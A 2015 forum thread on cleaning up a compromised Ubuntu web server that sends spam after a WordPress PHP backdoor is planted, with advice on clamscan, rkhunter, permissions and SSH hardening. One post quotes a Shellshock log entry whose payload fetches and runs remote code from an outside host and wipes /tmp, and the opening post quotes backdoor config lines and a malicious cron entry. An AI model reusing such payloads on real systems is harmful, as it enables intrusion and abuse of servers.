---
title: "postfix sending spam, background daemon?"
date: 2015-10-01
forum: Server Platforms
---

### Post by didrocks88 on 2015-10-01
Hello everybody, first post here... nice to meet you and hope you can give me a hand. Thanks in advance. I just posted this on stackexchange and I'm reposting it here, hoping in a helping hand
I am running Ubuntu 14.04.3 with apache2, postfix and dovecot. Today (about 24 hours ago) my server started sending spam (like 10-20 mails to random addresses every 2-3 minutes) and I got blacklisted. Postfix is using authentication. After investigating, analyzing the logs and such, I found a suspicious file, which I erased, inside a wordpress installation. These were the contents:
$auth_pass = "63a9f0ea7bb98050796b649e85481845";
$color = "#df5";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'Windows-1251';
$xYEzDu6r3EZT="very long string here"));                                                                            
An unix user also had this in the crontab
* * * * * /tmp/ /.random/update >/dev/null 2>&1
I also removed this from the crontab
The server keeps on spamming, as I can see periodically from lsof and mail.log. I stopped apache2, to be sure it's not a php script called from the outside. Nothing again.
Next step was stopping port 25 and 465 from listening from inside /etc/postfix/master.cf. Again, it keeps on spamming. I even tried stopping the unix port from listening, and it keeps on trying sending spam and I get lines like this:
Oct  2 02:52:46 ubuntu postfix/error[4709]: 0D7703622121: to=<polisenos@bellsouth.net>, relay=none, delay=49829, delays=49829/0/0/0, dsn=4.3.0, status=deferred (mail transport unavailable)
The server has been marked as spammer in spamhaus and emails coming from it are refused from most servers. /tmp and /var/tmp are empty, maldet, chkrootkit and rkhunter can't find anything. I've checked auth.log and nobody got in besides me. Looks like there's a malware/daemon/process calling postfix every 2-3 minutes, but I really can't find it. I'm clueless. It's a production server and I'm big trouble, hope somebody can help. Thanks

---

### Post by nerdtron on 2015-10-02
My policy is that if you suspected someone change the system, (in this case, it's clear) then immediately take the server offline. You don't know what else changed on the server. A good hacker will probably install something other than the obvious ones. And your server may not just be sending spam it may as well be sending confidential information to the outside world.

---

### Post by lisati on 2015-10-02
Agreed, take the server offline so you can investigate and take corrective action.

As well as mail.log, I'd suggest looking at your outgoing mail queue. If you're lucky, you will be able see any unwanted outgoing mail before it gets delivered, and be able to put it on hold or delete it before any further damage is done. It might be a good idea to capture some of the spam so it can be used as evidence if the need arises.

---

### Post by Habitual on 2015-10-02
[Found new backdoor script and decoded version]("https://gist.github.com/laacz/9934579").
shows you are not alone.
Wordpress version?

Someone or some thing is dropping malicious files into your Wordpress directory structure.

[http://codex.wordpress.org/Hardening_WordPress](http://codex.wordpress.org/Hardening_WordPress) should be adhered to.

---

### Post by SeijiSensei on 2015-10-02
From experience, the only directory that needs to be writable by Wordpress is the current year and month subdirectories of wp-content/uploads/.  You should only enable write privileges in other directories like wp-modules during updates and turn them off immediately thereafter.  Leaving a WP site, or sites using Joomla or other CMS software, with unnecessary writable directories is an invitation to hackers.

---

### Post by didrocks88 on 2015-10-03
> **Habitual said:**
> [Found new backdoor script and decoded version]("https://gist.github.com/laacz/9934579").
shows you are not alone.
Wordpress version?

Someone or some thing is dropping malicious files into your Wordpress directory structure.

[http://codex.wordpress.org/Hardening_WordPress](http://codex.wordpress.org/Hardening_WordPress) should be adhered to.

Thanks... it seems to be just that. But it keeps on going on even after I erased it and shut down apache. It seemed to stop for a while after I reinstalled postfix, but it started again some hours ago. It doesn't make sense to me, I mean, I don't know what's triggering it now. What can I do?

I'd really like to take the server offline, backup the important (and safe) sites and the mail directories and start from scratch, but I can't do it since it's a remote machine in a server farm.

---

### Post by Habitual on 2015-10-03
How about access to the host then?  root permitted to login? Passwords or ssh-keys?

"Started again some hours ago" -- another dropped backdoor file with some nasty code? If so, what it's name?
Search the apache logs for the filename of the suspect file.

Does it all seem to originate in the Wordpress installation?

Why can't you backup a remote server?
I think you're missing something or skipped a step in the hardening Wordpress walk-through.
You said "An unix user" ... which account? I'd examine that very closely.
Is 'user' a real user of the system or a system account?

Just because /tmp and /var/tmp are empty doesn't mean anything as remote attacks can look like this:
```
58.96.174.138 - - [05/Sep/2015:06:04:31 -0700] "GET /cgi-bin/hello.cgi  HTTP/1.1" 404 396 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type:  text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://lbinvestment.com/luci.c -O /tmp/luci.c;curl -O /tmp/luci.c http://lbinvestment.com/luci.c;perl /tmp/luci.c;rm -rf * && rm -rf /tmp/luci.c*\");'" 
``` Notice what the end of that does! Cleans up /tmp.

I put [addressd.php]("https://gist.githubusercontent.com/laacz/9934579/raw/6ef042a0c06af8d1c101606f1121e82693aa489e/addressd.php") into my /tmp and ran rkhunter 1.4.3 on the system and it missed it. Likely since it's a backdoor not a rootkit.
[COLOR=#ff0000]**clamscan found it.**[/COLOR]
```
clamscan -ir /tmp
```
> /tmp/addressd.php: {HEX}php.cmdshell.unclassed.359.UNOFFICIAL FOUND

----------- SCAN SUMMARY -----------
Known viruses: 4019417
Engine version: 0.98.7
Scanned directories: 2
Scanned files: 5
Infected files: 1
Data scanned: 0.12 MB
Data read: 0.27 MB (ratio 0.47:1)
Time: 12.044 sec (0 m 12 s)

so, install clamscan using sudo ```
apt-get install clamscan
``` and update it with ```
freshclam
```

then run it manually with 
```
clamscan -ir /var/www/html
```

Examine found files, note the directory they are in!
check perms on that directory, or directories.
```
stat --printf "%a %n \n "' /path/to/directory/
```
What are the permissions on it/them?

Re-read [http://codex.wordpress.org/Hardening_WordPress](http://codex.wordpress.org/Hardening_WordPress)

Thank you.

NOTE: I ran
```
clamscan -ir /tmp --remove=yes
```as [COLOR=#ff0000]clamscan does not clean infections[/COLOR], but it can remove them. And it did remove it.
I'd use "--remove=yes" with caution, or
try this:
```
mkdir /root/examine/
clamscan -ir /var/www/html/ --move=/root/examine/
```

and then examine the /root/examine directory. or outright nuke the contents.

---

### Post by didrocks88 on 2015-10-03
Thank you for your attention Habitual... I will try to make things clearer.
I'm the only administrator on the server. No one else's supposed to have access to it through ssh besides me and thus I'm the only "real" unix user on the system. I'm not using ssh keys, just plain passwords but very complex, and I've changed it recently, before and after the "hacking". Auth.log clearly states that no user had access to the shell besides my account, and I'm pretty sure I remember each time I logged in. Among the other "fake" users like www-data and such there's a firebird user which firebird server creates upon installation. I had seen from auth log that some user had something in the cron every minute. User firebird had this in its crontab: [COLOR=#000000]* * * * * /tmp/ /.random/update >/dev/null 2>&1 .   [/COLOR]I deleted it as soon as I noticed it; I've checked all crontabs and cron.daily, weekly and monthly and there's nothing wrong.
I've already run clamscan, updating it first just like you say. Only things I had not done, was hardening all my wordpress installations, and that's a big fault of mine. I have done it now (find /wordpress/dir -type d -exec chmod 755 {} \; find /wordpress/dir -type f -exec chmod 644 {} \;), rescanned the system with clam and rkhunter. I've also completely removed the wordpress installation which was infected with that script (it was, fortunately, just a demo and not so important).
Then, I emptied my postfix queue and rotated mail.log so I can check things better. All seems to work right ATM, no spam.

Problem is, I did all this (apart from removing that wordpress installation completely and hardening permissions) like 24 hours ago. Everything worked fine for 15-16 hours, then it started again. If I only knew a way to tell (and log) what php script/process/virtual mail user is calling the smtp process it'd be much easier. When I use lsof -i | grep smtp, right when the spam happens, I get the pid of the smtp process. I tried using parent id to go back to the parent process which was bash. And that worried me even more.

---

### Post by Habitual on 2015-10-03
www-data is not a "fake" user, but a service daemon account. Totally valid.
I would disable the password login ability for the ssh service and generate yourself an  ssh key and use that.
[Think you have a strong password? Hackers crack 16-character passwords in less than an HOUR]("http://www.dailymail.co.uk/sciencetech/article-2331984/Think-strong-password-Hackers-crack-16-character-passwords-hour.html")
Strong passwords and ssh keys are moot if they can drop in a backdoor shell that bypasses system-level security.

I don't know firebird but "[COLOR=#000000]/tmp/ /.random/update" may be valid for that install. Looks wonky to me.[/COLOR]
Have you looked for "[COLOR=#000000]/.random" directory and examined the update file?
**Directory name alone is immediately suspect**.
Why do you need firebird? It's a database, yes?

```
find `pwd` / -name ".random" -type d
```
[/COLOR][COLOR=#000000]
[/COLOR]Since you are taking direction really well here and seem willing to do the right things, I am willing to help 
you get through this. I'm just not sure the indirect route (delayed forum posting/responding) is the most
prudent method of getting it done.
Either way, Careful planning is critical.

I am also not comfortable that this backdoor shell hasn't dropped another means of getting back into the 
system. The whole system is now suspect.

Has rkhunter shown any Warnings that cannot be explained?

Subscribed with interest.

JJ

---

### Post by didrocks88 on 2015-10-03
Of course I know www-data is a valid user. What I meant is it can't be used to log in since it has /usr/sbin/nologin is /etc/passwd. The same is with user firebird. Fake is not quite the word, I know, but I'm, say, self-taught, I work alone most of the time and I'm not a native english speaker. Sorry.
About ssh keys, I need to access the bash quite often and from different places; not having the key with me could be a problem. I need firebird on the system since one of the sites on it displays info and documents from a firebird db (used by a legacy program atm that can't be rewritten to use mysql) which is synced daily from another system (safe, in a very safe environment and firewalled, using ssh keys to authenticate; it's supposed to rsync one file at a certain hour and auth.log shows it's so. I think it has nothing to do with this). Firebird creates a user upon installation, which must own the firebird db files; it refuses to work otherwise.
Your command doesn't find anything; I didn't find any .random directory either when I looked for it as soon as I found that thing in the crontab.

I fear just what you say, that the whole system is compromised and the backdoor shell opened another way to get back in somehow... anyway, as of now, everything's working regularly.

Now that I look better at it, rkhunter doesn't find anything but gives out some pretty suspicious warning; here they are:

```


[19:24:36]   /usr/bin/mail                                   [ Warning ]
[19:24:36] Warning: The file properties have changed:
[19:24:36]          File: /usr/bin/mail
[19:24:36]          Current inode: 24648745    Stored inode: 24651635
[19:24:36]          Current file modification time: 1443751407 (02-Oct-2015 04:03:27)
[19:24:36]          Stored file modification time : 1423048051 (04-Feb-2015 12:07:31)


[19:24:38]   /usr/bin/unhide.rb                              [ Warning ]
[19:24:38] Warning: The command '/usr/bin/unhide.rb' has been replaced by a script: /usr/bin/unhide.rb: Ruby script, ASCII text


[19:24:39]   /usr/bin/mail.mailutils                         [ Warning ]
[19:24:39] Warning: The file properties have changed:
[19:24:39]          File: /usr/bin/mail.mailutils
[19:24:39]          Current inode: 24648154    Stored inode: 24650898


[19:36:12]   Checking if SSH root access is allowed          [ Warning ]
[19:36:12] Warning: The SSH and rkhunter configuration options should be the same:
[19:36:12]          SSH configuration option 'PermitRootLogin': without-password
[19:36:12]          Rkhunter configuration option 'ALLOW_SSH_ROOT_USER': no


[19:46:29]   Checking /dev for suspicious file types         [ Warning ]
[19:46:29] Warning: Suspicious file types found in /dev:
[19:46:29]          /dev/.udev/rules.d/root.rules: ASCII text
[19:46:29]   Checking for hidden files and directories       [ Warning ]
[19:46:29] Warning: Hidden directory found: '/dev/.udev: directory '
[19:46:29] Warning: Hidden file found: /dev/.initramfs: symbolic link to `/run/initramfs'


```
The mail and mail.mailutils look really suspicious but I don't know what to do. I checked unhide.rb but looks normal to me.
Anyway, the server has not sent spam since what I've told you before (hardening, cleaning queue, checking again)

Habitual, I can't thank you enough for your help... at this point, I'd like to resolve the matter not just for me but anybody else who gets infected; info on the internet really seems to be very scarce.

---

### Post by Habitual on 2015-10-03
Well. It's sounding better and better *this time around*.

When folks install install rkhunter and run it they get some pretty scary output.
These, I usually exclude since they are 'common' to Ubuntu systems.
These exclusions take place in /etc/rkhunter.conf.

IF you **know** the system to be clean, edit /etc/rkhunter.conf and add these to the bottom of the file:
```
vi + /etc/rkhunter.conf
``` (or use your favorite editor, but you have to edit with elevated privileges, eg: root)
and add this:
```
ALLOWHIDDENFILE=/dev/.initramfs
ALLOWHIDDENFILE=/dev/.blkid.tab
ALLOWHIDDENFILE=/dev/.blkid.tab.old
ALLOWHIDDENDIR=/etc/.java
ALLOWDEVFILE=/dev/.udev/rules.d/root.rules
ALLOWDEVFILE=/dev/.blkid.tab
ALLOWHIDDENDIR=/dev/.udev
SCRIPTWHITELIST=/usr/sbin/adduser
SCRIPTWHITELIST=/usr/bin/ldd
SCRIPTWHITELIST=/bin/which
```
save and exit, or exit with save.
Then check your edits using:
```
rkhunter --checkconfig
```
It should come back to the prompt if it's a "good" conf edit.

Then run ```
rkhunter --propupd
```
This updates the rkhunter dat file/db/thingie with the new properties.
Then re-run something like this:
```
rkhunter -c -sk --display-logfile
``` or... you can not use --display-logfile but you'll have to manually look at 
/var/log/rkhunter.log after the scan for Warnings:

```

[19:24:36]          Current file modification time: 1443751407 (02-Oct-2015 04:03:27) 
[19:24:36]          Stored file modification time : 1423048051 (04-Feb-2015 12:07:31)
```tells us that file: /usr/bin/mail changed
This may have occurred as a result of an exploit, or more likely, 
you updated the postfix package since last running rkhunter
and omitted to update the --propupd settings.

wrt: unhide.rb:
You could add it to the whitelist, if you choose. It's a known 'thing' with rkhunter's 'default' settings on Ubu-flavored hosts).
I'm not calling it an "issue" or a "bug", it is what it is. 

If you have an ssh key to access the host, you can edit /etc/ssh/sshd_config 
and set this:
```
PermitRootLogin no
``` exit and restart ssh using
```
service ssh restart
```
**Stay connected to the host** and open a new terminal (or tab) and test the new policy like so
```
ssh root@server.ip
``` and try the root password. You should see this prohibitive message:
```
Permission denied (publickey,password).
``` So, you will have to use an ssh-key for a user on the system that is NOT root and login as that user and ```
sudo su -
``` to get root after your key is in place.

So the Recipe is as follows:
Edit /etc/rkhunter.conf
run rkhunter --propupd
run rkhunter -c -sk
examine /var/log/rkhunter.log
adjust /etc/rkhunter.conf if necessary and 
re-run rkhunter --propupd and 
re-run rkhunter -c -sk.

Once your known clean system runs ```
rkhunter -c -sk
``` and it shows "No Warnings",
then...
every time you update the system using apt-get upgrade or anything like that (dist-upgrade) and packages
are updated, you have to re-run ```
rkhunter --propupd
```

The Ubu repo shows
```
apt-cache show rkhunter | grep ^Version
```
Version: 1.4.0-3
and installs the rkhunter program to /usr/bin/rkhunter

I use the latest and I install it with this recipe and it replaces the repo version.
```
 cd /usr/src/
wget [http://rkhunter.cvs.sourceforge.net/viewvc/rkhunter/rkhunter/?view=tar](http://rkhunter.cvs.sourceforge.net/viewvc/rkhunter/rkhunter/?view=tar)
mv index.html\?view\=tar rkhunter.tar.gz
tar zxf rkhunter.tar.gz
mv rkhunter rkhunter-1-4-3
cd  rkhunter-1-4-3
./installer.sh --install
rkhunter --update
rkhunter --propupd


```

Let me know...
JJ

References:
[https://help.ubuntu.com/community/RKhunter](https://help.ubuntu.com/community/RKhunter)
[http://rkhunter.sourceforge.net/](http://rkhunter.sourceforge.net/)
[https://www.digitalocean.com/community/tutorials/how-to-use-rkhunter-to-guard-against-rootkits-on-an-ubuntu-vps](https://www.digitalocean.com/community/tutorials/how-to-use-rkhunter-to-guard-against-rootkits-on-an-ubuntu-vps)

---

### Post by didrocks88 on 2015-10-03
Ok, I did everything you suggested, I also updated rkhunter to the latest like you said in the end. I did purge and reinstall postfix and mailutils in the process of cleaning up, but after the first rkhunter check, so it all makes sense (and explain why I didn't notice in the first place). Anyway, no more warnings, except for unhide.rb and the ssh thing which I prefer to leave as is since, like I said, I need to keep logging to my account with a password and then sudo. root is passwordless anyway so it can't be reached without su from a sudoer.
Mail.log still shows things are alright, message count (I'm using a perl script I found) seems regular. Is there anything else I can try and check?

---

### Post by Habitual on 2015-10-03
You may also wish to install logwatch.

---

